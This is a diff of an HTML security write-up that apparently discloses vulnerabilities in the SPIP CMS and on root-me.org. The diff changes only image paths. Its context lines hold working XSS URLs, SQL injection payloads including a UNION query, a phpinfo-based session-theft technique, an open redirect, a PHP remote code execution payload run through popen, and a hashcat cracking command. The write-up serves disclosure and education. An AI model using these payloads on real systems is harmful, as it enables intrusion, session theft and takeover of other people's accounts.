@@ -209,7 +209,7 @@ This article is about Spip, <a href="https://www.root-me.org/">root-me.org</a>, 
 Ever wondered how secure is your daily website ? <br />
 Welcome. To. Php.</p>
 
-<p><img class="img_med" src="/hacking/rce_on_spip_and_root_me/sparta_php.jpg" alt="sparta_php"></p>
+<p><img class="img_med" src="sparta_php.jpg" alt="sparta_php"></p>
 
 <h2 id="quick-disclaimer-before-we-start">Quick disclaimer before we start:</h2>
 
@@ -234,7 +234,7 @@ This article and research has no link with this incident <strong>whatsoever</str
 
 <p>You know what?</p>
 
-<p><img class="img_med" src="/hacking/rce_on_spip_and_root_me/buzz_xss.jpg" alt="buzz_xss"></p>
+<p><img class="img_med" src="buzz_xss.jpg" alt="buzz_xss"></p>
 
 <h1 id="setup-the-environment">Setup the environment</h1>
 
@@ -310,7 +310,7 @@ services:
 http://lokal/ecrire/?exec=rubriques&amp;titre=pouet%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_titre.jpg" alt="xss_titre"></p>
+<p><img class="img_big" src="xss_titre.jpg" alt="xss_titre"></p>
 
 <h3 id="xss-on-label">XSS on label</h3>
 
@@ -318,7 +318,7 @@ http://lokal/ecrire/?exec=rubriques&amp;titre=pouet%3Ca%20href=err%20onfocus=ale
 http://lokal/ecrire/?exec=rubriques&amp;label=laluka%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_label.jpg" alt="xss_label"></p>
+<p><img class="img_big" src="xss_label.jpg" alt="xss_label"></p>
 
 <h3 id="xss-on-size-input">XSS on size_input</h3>
 
@@ -326,7 +326,7 @@ http://lokal/ecrire/?exec=rubriques&amp;label=laluka%3Ca%20href=err%20onfocus=al
 http://lokal/ecrire/?exec=rubriques&amp;size_input=lalu%22%20onfocus=alert(domain)%20autofocus%20foo=%22
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_size_input.jpg" alt="xss_size_input"></p>
+<p><img class="img_big" src="xss_size_input.jpg" alt="xss_size_input"></p>
 
 <h3 id="xss-on-sinon">XSS on sinon</h3>
 
@@ -334,7 +334,7 @@ http://lokal/ecrire/?exec=rubriques&amp;size_input=lalu%22%20onfocus=alert(domai
 http://lokal/ecrire/?exec=article&amp;id_article=1&amp;sinon=%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_sinon.jpg" alt="xss_sinon"></p>
+<p><img class="img_big" src="xss_sinon.jpg" alt="xss_sinon"></p>
 
 <h3 id="xss-on-null">XSS on null</h3>
 
@@ -345,20 +345,20 @@ The idea here is to have a style to cover the full screen, and execute an action
 http://lokal/ecrire/?exec=plan&amp;null=lalu%27%20onmouseover=alert(domain)%20style=%27width:9999999px;height:9999999px;%27%20foo=
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_null.jpg" alt="xss_null"></p>
+<p><img class="img_big" src="xss_null.jpg" alt="xss_null"></p>
 
 <h3 id="xss-on-quoi-ie-specific">XSS on quoi (ie-specific)</h3>
 
 <pre><code class="language-html">http://localhost:8000/ecrire/?exec=messages&amp;typem=tout&amp;quoi='/&gt;ie_specific_xss&lt;script&gt;alert(domain)&lt;/script&gt;'
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_quoi_ie.jpg" alt="xss_quoi_ie"></p>
+<p><img class="img_big" src="xss_quoi_ie.jpg" alt="xss_quoi_ie"></p>
 
 <p>Sometimes, it&rsquo;s more efficient to steal admin&rsquo;s session in order to browse the website while in our own browser. This might not be trivial to achieve as nowadays, session cookies, authentication tokens and such are protected by mitigations like the flags <code>secure</code> and <code>httpOnly</code> (and tons of others, but that not today&rsquo;s story!). <br />
 Here, the quick win was to realize that Spip exposes <code>by default</code> an access to <code>phpinfo()</code> for webmasters. So our xss can, if visited by a webmaster, make that juicy request and get the whole phpinfo output. The best thing here is that it contains information on the system, the current php installation, but also the user&rsquo;s session variables! So any xss found on an install where phpinfo isn&rsquo;t disabled can lead to a direct webmaster session takeover by stealing session cookies and applying them in out own browser. <br />
 Click&rsquo;n&rsquo;Woosh!</p>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/phpinfo_session.jpg" alt="phpinfo_session"></p>
+<p><img class="img_big" src="phpinfo_session.jpg" alt="phpinfo_session"></p>
 
 <h3 id="reflected-file-download">Reflected file download</h3>
 
@@ -367,7 +367,7 @@ Click&rsquo;n&rsquo;Woosh!</p>
 <pre><code class="language-html">http://lokal/spip.php?action=converser&amp;redirect=data%253Aimage/svg+xml,content 
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/reflected_file_download.jpg" alt="reflected_file_download"></p>
+<p><img class="img_big" src="reflected_file_download.jpg" alt="reflected_file_download"></p>
 
 <h3 id="open-redirect">Open redirect</h3>
 
@@ -376,7 +376,7 @@ Click&rsquo;n&rsquo;Woosh!</p>
 <pre><code class="language-html">https://www.root-me.org/spip.php?action=converser&amp;redirect=https%253A//thinkloveshare.com/ 
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/open_redirect_rootme.jpg" alt="open_redirect_rootme"></p>
+<p><img class="img_big" src="open_redirect_rootme.jpg" alt="open_redirect_rootme"></p>
 
 <h2 id="sql-injections">SQL injections</h2>
 
@@ -392,14 +392,14 @@ Error logging was enabled, quotes were injected, SQL errors were raised. Amen.</
 <pre><code class="language-html">http://lokal/ecrire/?exec=accueil&amp;where=SQLI_HERE
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/sqli_where.jpg" alt="sqli_where"></p>
+<p><img class="img_big" src="sqli_where.jpg" alt="sqli_where"></p>
 
 <h3 id="sql-injection-on-lier-trad">SQL injection on lier_trad</h3>
 
 <pre><code class="language-html">http://localhost:8000/ecrire/?exec=article_edit&amp;new=oui&amp;id_rubrique=1&amp;lier_trad=%27
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/sqli_lier_trad.jpg" alt="sqli_lier_trad"></p>
+<p><img class="img_big" src="sqli_lier_trad.jpg" alt="sqli_lier_trad"></p>
 
 <p>Two backends are supported by Spip: MySQL and SQLite.</p>
 
@@ -415,7 +415,7 @@ http://lokal/ecrire/?exec=article_edit&amp;lier_trad=1+AND+10=LIKE(0x41,UPPER(HE
 http://lokal/ecrire/?exec=article_edit&amp;lier_trad=1+AND+1%3D2%20union%20all%20select%201,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25;--
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/sqli_lier_trad_poc.jpg" alt="sqli_lier_trad_poc"></p>
+<p><img class="img_big" src="sqli_lier_trad_poc.jpg" alt="sqli_lier_trad_poc"></p>
 
 <p>Both of these SQL injections can be reached as a webmaster, an administrator, or even an author. Only the visitor role is restricted from accessing the /ecrire panel). This implies that an author can leak password hashes from every user, including admin and webmaster, crack them offline, and takeover highly privileged accounts, and thus either get code execution, or affect other user&rsquo;s.</p>
 
@@ -433,7 +433,7 @@ The first one is internet-explorer specific as it doesn’t url-encode bad chars
 <pre><code class="language-html">http://lokal/ecrire/?exec=admin_plugin&amp;var_profile=pouet'/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_var_profile_ie.jpg" alt="xss_var_profile_ie"></p>
+<p><img class="img_big" src="xss_var_profile_ie.jpg" alt="xss_var_profile_ie"></p>
 
 <h3 id="xss-on-oups">&ldquo;XSS&rdquo; on _oups</h3>
 
@@ -443,7 +443,7 @@ The first one is internet-explorer specific as it doesn’t url-encode bad chars
 https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;_oups=pouet%27/%3E%3Ca%20href=err%20onfocus=alert(domain)%20autofocus/%3E
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_oups.jpg" alt="xss_oups"></p>
+<p><img class="img_big" src="xss_oups.jpg" alt="xss_oups"></p>
 
 <p>As I spent two weeks trying to get code execution via local file inclusion, token leaking via the SQLi, attempts to insert serialized objects in the database, and so on. I eventually gave up, assuming that only XSS and SQLi were present. But the very next day, <a href="https://www.root-me.org/g0uZ">g0uZ</a> (admin at root-me, dev at Spip, what a small world! ) came back to me, explaining that &ldquo;the last XSS you found is a Remote Code Execution&rdquo;. I was a bit pissed, like &ldquo;Come on, I already spent too many nights, I’m done here&rdquo;. But I was not!<br />
 He teased me enough to open burp, start the env, put on my hoodie and inject code!<br />
@@ -459,7 +459,7 @@ This vulnerability can be reached as a webmaster, admin, or author.</p>
 
 <li><p>Analyse the generated stacktraces, determine that eval is the sink<br />
 I know this is wayyy too small, text version below..
-<img class="img_big" src="/hacking/rce_on_spip_and_root_me/stacktrace.jpg" alt="stacktrace"></p>
+<img class="img_big" src="stacktrace.jpg" alt="stacktrace"></p>
 
 <pre><code>#0  eval() called at [/issue_4494/ecrire/public/evaluer_page.php:55]
 #1  include(/issue_4494/ecrire/public/evaluer_page.php) called at [/issue_4494/ecrire/public/assembler.php:657]
@@ -496,11 +496,11 @@ Red: Where it got reflected and then, not-so-safe context</p>
 https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups=%27%3C?php%20debug_print_backtrace();die();?%3E
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/reflected_oups.jpg" alt="reflected_oups">
-<img class="img_med" src="/hacking/rce_on_spip_and_root_me/eval_debug.jpg" alt="eval_debug"></p></li>
+<p><img class="img_big" src="reflected_oups.jpg" alt="reflected_oups">
+<img class="img_med" src="eval_debug.jpg" alt="eval_debug"></p></li>
 
 <li><p>Spawn a phpinfo to see what is allowed / forbidden
-<img class="img_big" src="/hacking/rce_on_spip_and_root_me/phpinfo.jpg" alt="phpinfo"></p></li>
+<img class="img_big" src="phpinfo.jpg" alt="phpinfo"></p></li>
 
 <li><p>Bypass the php disable_functions policies with <code>popen</code> which wasn’t restricted // Edit, I probably just forgot to echo the result of shell_exec.. :)</p>
 
@@ -508,15 +508,15 @@ https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&am
 https://www.root-me.org/ecrire/?exec=article&amp;id_article=1&amp;ajouter=non&amp;tri_liste_aut=statut&amp;deplacer=oui&amp;_oups=%27%3C?php%20echo%20fread(popen(%22id%22,%20%22r%22),%20300);?%3E
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/cmd_id.jpg" alt="cmd_id"></p></li>
+<p><img class="img_big" src="cmd_id.jpg" alt="cmd_id"></p></li>
 
 <li><p>Profit?!
-<img class="img_big" src="/hacking/rce_on_spip_and_root_me/cmd_uname.jpg" alt="cmd_uname"></p></li>
+<img class="img_big" src="cmd_uname.jpg" alt="cmd_uname"></p></li>
 </ol>
 
 <blockquote>
 <p>Honestly, I never thought I would one day pwn root-me, but hey, here we are, and I&rsquo;m so frikkin&rsquo; happy! :D
-<img class="img_small" src="/hacking/rce_on_spip_and_root_me/happy_owl.jpg" alt="happy_owl"></p>
+<img class="img_small" src="happy_owl.jpg" alt="happy_owl"></p>
 </blockquote>
 
 <h1 id="is-root-me-more-secure-than-spip-itself">Is root-me more secure than spip itself?</h1>
@@ -530,7 +530,7 @@ More information about this mode here: <a href="https://www.spip.net/en_article4
 https://www.root-me.org/ecrire/?exec=plan&amp;null=lalu%27%20onmouseover=alert(domain)%20style=%27width:9999999px;height:9999999px;%27%20foo=
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/xss_null_rootme.jpg" alt="xss_null_rootme"></p>
+<p><img class="img_big" src="xss_null_rootme.jpg" alt="xss_null_rootme"></p>
 
 <h2 id="sqli-wise">SQLi wise</h2>
 
@@ -547,7 +547,7 @@ https://www.root-me.org/ecrire/?exec=plan&amp;null=lalu%27%20onmouseover=alert(d
 <pre><code class="language-bash">docker run --rm -it -v $(pwd):/host dockit dizcza/docker-hashcat:intel-cpu hashcat
 </code></pre>
 
-<p><img class="img_big" src="/hacking/rce_on_spip_and_root_me/hashcat.jpg" alt="hashcat"></p>
+<p><img class="img_big" src="hashcat.jpg" alt="hashcat"></p>
 
 <p>After discussing these issues with the admins, md5crypt has been removed. They were actually already using sha256, md5crypt being only forgotten legacy and is now gone! <br />
 Another security feature has been added and enforced for admins: GPG</p>
@@ -583,7 +583,7 @@ Another security feature has been added and enforced for admins: GPG</p>
 
 <p><a href="https://github.com/spip/SPIP/blob/0394b44774555ae8331b6e65e35065dfa0bb41e4/prive/formulaires/editer_liens.php#L131">https://github.com/spip/SPIP/blob/0394b44774555ae8331b6e65e35065dfa0bb41e4/prive/formulaires/editer_liens.php#L131</a></p>
 
-<p><img class="img_med" src="/hacking/rce_on_spip_and_root_me/the_patch.png" alt="the_patch"></p>
+<p><img class="img_med" src="the_patch.png" alt="the_patch"></p>
 
 <h1 id="kudos">Kudos</h1>
 
